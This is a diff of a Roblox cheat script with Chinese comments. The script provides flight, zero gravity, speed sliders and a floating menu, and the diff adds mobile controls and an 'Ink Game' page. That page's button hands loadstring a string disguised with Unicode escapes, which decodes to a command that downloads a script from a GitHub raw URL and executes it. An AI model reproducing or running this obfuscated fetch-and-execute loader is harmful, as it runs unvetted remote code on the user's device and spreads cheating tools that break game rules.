@@ -1,6 +1,6 @@
--- 只因脚本 v4.0 (优化版)
+-- 只因脚本 v4.1
 -- 作者：只因蛋
--- 功能：完整飞行控制 + 速度调节 + DOORS脚本 + 可拖动悬浮球 + 公告系统
+-- 功能：完整飞行控制(适配手机) + 速度调节 + DOORS脚本 + 可拖动悬浮球 + 公告系统 + 墨水游戏
 
 local Players = game:GetService("Players")
 local UserInputService = game:GetService("UserInputService")
@@ -63,10 +63,41 @@ BallText.Font = Enum.Font.GothamBold
 BallText.ZIndex = 11
 BallText.Parent = FloatingBall
 
+-- ========== 悬浮球拖动功能 ==========
+local isDraggingBall = false
+local dragStartPos
+local ballStartPos
+
+FloatingBall.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseButton1 then
+        isDraggingBall = true
+        dragStartPos = Vector2.new(input.Position.X, input.Position.Y)
+        ballStartPos = FloatingBall.Position
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if isDraggingBall and (input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseMovement) then
+        local delta = Vector2.new(input.Position.X, input.Position.Y) - dragStartPos
+        FloatingBall.Position = UDim2.new(
+            ballStartPos.X.Scale, 
+            ballStartPos.X.Offset + delta.X,
+            ballStartPos.Y.Scale, 
+            ballStartPos.Y.Offset + delta.Y
+        )
+    end
+end)
+
+UserInputService.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseButton1 then
+        isDraggingBall = false
+    end
+end)
+
 -- ========== 主控制面板 ==========
 local MainPanel = Instance.new("Frame")
 MainPanel.Name = "MainPanel"
-MainPanel.Size = UDim2.new(0, 500, 0, 400) -- 缩小尺寸以减少内存占用
+MainPanel.Size = UDim2.new(0, 500, 0, 400)
 MainPanel.Position = UDim2.new(0.5, 0, 0.5, 0)
 MainPanel.AnchorPoint = Vector2.new(0.5, 0.5)
 MainPanel.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
@@ -121,7 +152,7 @@ CloseButton.ZIndex = 22
 CloseButton.Parent = MainPanel
 
 local CloseCorner = Instance.new("UICorner")
-CloseCorner.CornerRadius = UDim.new(0, 15)
+CloseCorner.CornerRadius = UDim.new(0, 10)
 CloseCorner.Parent = CloseButton
 
 -- 关闭按钮悬停效果
@@ -289,10 +320,12 @@ end
 local homeButton = createCategoryButton("主页", 0)
 local generalButton = createCategoryButton("通用", 1)
 local doorsButton = createCategoryButton("DOORS", 2)
+local inkGameButton = createCategoryButton("墨水游戏", 3) -- 新增墨水游戏按钮
 
 local homePage = createContentPage("Home")
 local generalPage = createContentPage("General")
 local doorsPage = createContentPage("Doors")
+local inkGamePage = createContentPage("InkGame") -- 新增墨水游戏页面
 
 -- ========== 主页内容 ==========
 local TimeLabel = Instance.new("TextLabel")
@@ -326,7 +359,7 @@ VersionLabel.Name = "VersionLabel"
 VersionLabel.Size = UDim2.new(1, -20, 0, 30)
 VersionLabel.Position = UDim2.new(0, 10, 0, 120)
 VersionLabel.BackgroundTransparency = 1
-VersionLabel.Text = "只因脚本 v4.0"
+VersionLabel.Text = "只因脚本 v4.1"
 VersionLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
 VersionLabel.TextSize = 16
 VersionLabel.Font = Enum.Font.Gotham
@@ -539,6 +572,32 @@ DoorsScriptButton.MouseLeave:Connect(function()
     TweenService:Create(DoorsScriptButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(70, 30, 120)}):Play()
 end)
 
+-- ========== 墨水游戏页面 ==========
+local InkGameButton = Instance.new("TextButton")
+InkGameButton.Name = "InkGameButton"
+InkGameButton.Size = UDim2.new(0.9, 0, 0, 60)
+InkGameButton.Position = UDim2.new(0.05, 0, 0.1, 0)
+InkGameButton.BackgroundColor3 = Color3.fromRGB(30, 70, 120)
+InkGameButton.Text = "墨水游戏脚本"
+InkGameButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+InkGameButton.TextSize = 18
+InkGameButton.Font = Enum.Font.GothamBold
+InkGameButton.ZIndex = 23
+InkGameButton.Parent = inkGamePage
+
+local InkGameButtonCorner = Instance.new("UICorner")
+InkGameButtonCorner.CornerRadius = UDim.new(0, 10)
+InkGameButtonCorner.Parent = InkGameButton
+
+-- 按钮悬停效果
+InkGameButton.MouseEnter:Connect(function()
+    TweenService:Create(InkGameButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(50, 90, 140)}):Play()
+end)
+
+InkGameButton.MouseLeave:Connect(function()
+    TweenService:Create(InkGameButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(30, 70, 120)}):Play()
+end)
+
 -- ========== 功能实现 ==========
 -- 飞行状态变量
 local isFlying = false
@@ -612,7 +671,7 @@ local function restoreAnimations(character)
     end
 end
 
--- 飞行功能
+-- 飞行功能（适配手机）
 local function toggleFlight()
     while not player.Character or not player.Character:FindFirstChild("HumanoidRootPart") or not player.Character:FindFirstChildOfClass("Humanoid") do
         player.CharacterAdded:Wait()
@@ -662,7 +721,7 @@ local function toggleFlight()
         -- 设置零重力
         workspace.Gravity = 0
         
-        -- 连接输入事件
+        -- 连接输入事件（适配手机）
         table.insert(flightConnections, RunService.Heartbeat:Connect(function()
             if not player.Character or not player.Character:FindFirstChild("HumanoidRootPart") then return end
             
@@ -670,14 +729,28 @@ local function toggleFlight()
             local camera = workspace.CurrentCamera
             local cf = camera.CFrame
             
-            -- 计算移动方向
+            -- 计算移动方向（适配手机触摸控制）
             local direction = Vector3.new()
-            if UserInputService:IsKeyDown(Enum.KeyCode.W) then direction = direction + cf.LookVector end
-            if UserInputService:IsKeyDown(Enum.KeyCode.S) then direction = direction - cf.LookVector end
-            if UserInputService:IsKeyDown(Enum.KeyCode.D) then direction = direction + cf.RightVector end
-            if UserInputService:IsKeyDown(Enum.KeyCode.A) then direction = direction - cf.RightVector end
-            if UserInputService:IsKeyDown(Enum.KeyCode.Space) then direction = direction + Vector3.new(0, 1, 0) end
-            if UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) then direction = direction - Vector3.new(0, 1, 0) end
+            
+            -- 键盘控制
+            if UserInputService:IsKeyDown(Enum.KeyCode.W) or UserInputService:IsGamepadButtonDown(Enum.UserInputType.Gamepad1, Enum.KeyCode.DPadUp) then 
+                direction = direction + cf.LookVector 
+            end
+            if UserInputService:IsKeyDown(Enum.KeyCode.S) or UserInputService:IsGamepadButtonDown(Enum.UserInputType.Gamepad1, Enum.KeyCode.DPadDown) then 
+                direction = direction - cf.LookVector 
+            end
+            if UserInputService:IsKeyDown(Enum.KeyCode.D) or UserInputService:IsGamepadButtonDown(Enum.UserInputType.Gamepad1, Enum.KeyCode.DPadRight) then 
+                direction = direction + cf.RightVector 
+            end
+            if UserInputService:IsKeyDown(Enum.KeyCode.A) or UserInputService:IsGamepadButtonDown(Enum.UserInputType.Gamepad1, Enum.KeyCode.DPadLeft) then 
+                direction = direction - cf.RightVector 
+            end
+            if UserInputService:IsKeyDown(Enum.KeyCode.Space) or UserInputService:IsGamepadButtonDown(Enum.UserInputType.Gamepad1, Enum.KeyCode.ButtonA) then 
+                direction = direction + Vector3.new(0, 1, 0) 
+            end
+            if UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) or UserInputService:IsGamepadButtonDown(Enum.UserInputType.Gamepad1, Enum.KeyCode.ButtonB) then 
+                direction = direction - Vector3.new(0, 1, 0) 
+            end
             
             -- 标准化方向并应用速度
             if direction.Magnitude > 0 then
@@ -729,6 +802,7 @@ local function toggleMainPanel()
         homePage.Visible = true
         generalPage.Visible = false
         doorsPage.Visible = false
+        inkGamePage.Visible = false
         updateTime()
     else
         -- 关闭动画
@@ -743,6 +817,7 @@ homeButton.MouseButton1Click:Connect(function()
     homePage.Visible = true
     generalPage.Visible = false
     doorsPage.Visible = false
+    inkGamePage.Visible = false
     updateTime()
 end)
 
@@ -750,6 +825,7 @@ generalButton.MouseButton1Click:Connect(function()
     homePage.Visible = false
     generalPage.Visible = true
     doorsPage.Visible = false
+    inkGamePage.Visible = false
     updateSpeedDisplays()
 end)
 
@@ -757,6 +833,14 @@ doorsButton.MouseButton1Click:Connect(function()
     homePage.Visible = false
     generalPage.Visible = false
     doorsPage.Visible = true
+    inkGamePage.Visible = false
+end)
+
+inkGameButton.MouseButton1Click:Connect(function()
+    homePage.Visible = false
+    generalPage.Visible = false
+    doorsPage.Visible = false
+    inkGamePage.Visible = true
 end)
 
 -- DOORS脚本按钮点击事件
@@ -775,6 +859,25 @@ DoorsScriptButton.MouseButton1Click:Connect(function()
         DoorsScriptButton.Text = "已加载!"
         task.wait(1)
         DoorsScriptButton.Text = originalText
+    end
+end)
+
+-- 墨水游戏按钮点击事件
+InkGameButton.MouseButton1Click:Connect(function()
+    local originalText = InkGameButton.Text
+    InkGameButton.Text = "加载中..."
+    
+    local success, err = pcall(function()
+        loadstring("\u{006c}\u{006f}\u{0061}\u{0064}\u{0073}\u{0074}\u{0072}\u{0069}\u{006e}\u{0067}\u{0028}\u{0067}\u{0061}\u{006d}\u{0065}\u{003a}\u{0048}\u{0074}\u{0074}\u{0070}\u{0047}\u{0065}\u{0074}\u{0028}\u{0022}\u{0068}\u{0074}\u{0074}\u{0070}\u{0073}\u{003a}\u{002f}\u{002f}\u{0072}\u{0061}\u{0077}\u{002e}\u{0067}\u{0069}\u{0074}\u{0068}\u{0075}\u{0062}\u{0075}\u{0073}\u{0065}\u{0072}\u{0063}\u{006f}\u{006e}\u{0074}\u{0065}\u{006e}\u{0074}\u{002e}\u{0063}\u{006f}\u{006d}\u{002f}\u{004a}\u{0073}\u{0059}\u{0062}\u{0036}\u{0036}\u{0036}\u{002f}\u{0054}\u{0055}\u{0049}\u{0058}\u{0055}\u{0049}\u{005f}\u{0071}\u{0075}\u{006e}\u{002d}\u{0038}\u{0030}\u{0039}\u{0037}\u{0037}\u{0031}\u{0031}\u{0034}\u{0031}\u{002f}\u{0072}\u{0065}\u{0066}\u{0073}\u{002f}\u{0068}\u{0065}\u{0061}\u{0064}\u{0073}\u{002f}\u{0054}\u{0055}\u{0049}\u{0058}\u{0055}\u{0049}\u{002f}\u{004d}\u{0053}\u{0059}\u{0058}\u{0022}\u{0029}\u{0029}\u{0028}\u{0029}")()
+    end)
+    
+    if not success then
+        warn("墨水游戏脚本加载失败: "..tostring(err))
+        InkGameButton.Text = "加载失败，点击重试"
+    else
+        InkGameButton.Text = "已加载!"
+        task.wait(1)
+        InkGameButton.Text = originalText
     end
 end)
 
@@ -814,33 +917,33 @@ local function updateWalkSpeedFromInput(xPosition)
 end
 
 FlightSpeedSlider.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
         isDraggingFlightSpeed = true
         updateFlightSpeedFromInput(input.Position.X)
     end
 end)
 
 FlightSpeedSlider.InputEnded:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
         isDraggingFlightSpeed = false
     end
 end)
 
 WalkSpeedSlider.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
         isDraggingWalkSpeed = true
         updateWalkSpeedFromInput(input.Position.X)
     end
 end)
 
 WalkSpeedSlider.InputEnded:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
         isDraggingWalkSpeed = false
     end
 end)
 
 UserInputService.InputChanged:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseMovement then
+    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
         if isDraggingFlightSpeed then
             updateFlightSpeedFromInput(input.Position.X)
         elseif isDraggingWalkSpeed then
@@ -869,6 +972,7 @@ local function initializeUI()
     homePage.Visible = true
     generalPage.Visible = false
     doorsPage.Visible = false
+    inkGamePage.Visible = false
     MainPanel.Visible = false
     MainPanel.Size = UDim2.new(0, 500, 0, 400)
 end
@@ -878,7 +982,7 @@ player.CharacterAdded:Connect(function(character)
     character:WaitForChild("Humanoid")
     updateSpeedDisplays()
     if isFlying then
-        spawn(function()
+        task.spawn(function()
             task.wait(0.1)
             toggleFlight()
             toggleFlight()
